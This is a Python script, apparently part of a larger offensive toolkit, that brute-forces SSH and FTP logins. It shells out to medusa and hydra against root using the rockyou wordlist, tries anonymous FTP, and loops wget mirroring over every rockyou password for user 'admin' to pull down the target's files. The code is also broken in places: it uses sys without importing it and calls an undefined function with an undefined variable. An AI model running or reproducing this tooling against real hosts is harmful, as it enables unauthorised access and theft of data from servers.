# LOCAL
from File_man import File_Man

# SYS_BASE
import subprocess
import time

class BruteSSH():
    def __init__(self, **kw):
        super(BruteSSH, self).__init__(**kw)
        self.FM         = File_Man()


    # ! INACTIVE
    def go_medusa(self, host_ip, file_dir):
        try:
            print("[RUNNING_]:[MEDUSA]:[THREAD]")
            to_bash = f"medusa -h {host_ip} -u root -P /usr/share/wordlists/rockyou.txt -M ssh -n 22 "
            hydra_ret = subprocess.getoutput(to_bash)
            self.FM.write_file(file_dir+"/medusa_.csv", hydra_ret, "\n", "a+")
        except Exception as e:
            print(f"[E]:[GO_HYDRA]:[>{str(e)}<]")


    # ! ACTIVE THREAD <- MetaFab
    def go_hydra(self, host_ip, file_dir):
        try:
            print("[RUNNING_]:[HYDRA]:[THREAD]")
            to_bash = f"hydra -l root -P  /usr/share/wordlists/rockyou.txt ftp://{host_ip}"
            hydra_ret = subprocess.getoutput(to_bash)
            self.FM.write_file(file_dir+"/hydra_.csv", hydra_ret, "\n", "a+")
        except Exception as e:
            print(f"[E]:[GO_HYDRA]:[>{str(e)}<]")


    # ! WRUTE MAIN_TOOL <- LOOP
    def wrute_login(self, name_, pswd_, IP_, prof_dir, i_):
        try:
            to_run = f" wget -m ftp://{name_}:{pswd_}@{IP_}"
            ret_run = f"\n[{str(i_)}] \n" + subprocess.getoutput(to_run) +"\n----------\n"
            print(f"[WGET_RETURN]:[{ret_run}]")
            self.FM.write_file(prof_dir+"/wrute_.csv", ret_run, "\n", "a+")
        except Exception as e:
            print(f"[E]:[WRUTE_]:[>{str(e)}<]")

    # ! ACTIVE THREAD <- MetaFab
    def wrute_loop(self, IP_, prof_dir):
        try:
            print("[RUNNING]:[WGET]:[ANON:ANON]")
            to_run = f" wget -m ftp://anonymous:anonymous@{IP_} "
            ret_run = subprocess.getoutput(to_run)
            print(f"[WGET_RETURN]:[ANON:ANON]:[{ret_run}]")
            print("\n... [(doubt that actually worked.. )]")
            print(f"[RETURN]:[{ret_run}]")
            print("[RUNNING]:[WRUTE_LOOP]")
            rock_list = "/usr/share/wordlists/rockyou.txt"
            to_loop = self.FM.read_file(rock_list, "\n")
            for i, pswd_ in enumerate(to_loop):
                #print(f"[WRUTE]:[PSWD]:[>{str(pswd_)}<]")
                self.wrute_login("admin", str(pswd_), IP_, prof_dir, i)
            print("[WRUTE_COMPLETED]")
        except Exception as e:
            print(f"[E]:[WRUTE_]:[>{str(e)}<]")





    # ! RUN ALL
#    def run_all(self, IP_, prof_dir):






print("\n")
print("@ ! ^^^^^^^^^^ ! @")
print("@ ! THE BRUTES ! @")
print("@ ! vvvvvvvvvv ! @")
print("\n")
print("[(this terminal will not exit on it's own..)]")


time.sleep(1.5)

# MUST BE STR -> seperated by ','
opt_list_str = str(sys.argv[1])

opt_list = opt_list_str.split(",")

print("[OPT_LIST]:")
for i, val_ in enumerate(opt_list):
    print(f"[{str(i)}]:[{str(val_)}]")
print(f"[PROF_DIR]:[{str(sys.argv[2])}]")

file_ = str(sys.argv[2])
da_subs_buster(sub_list, file_)






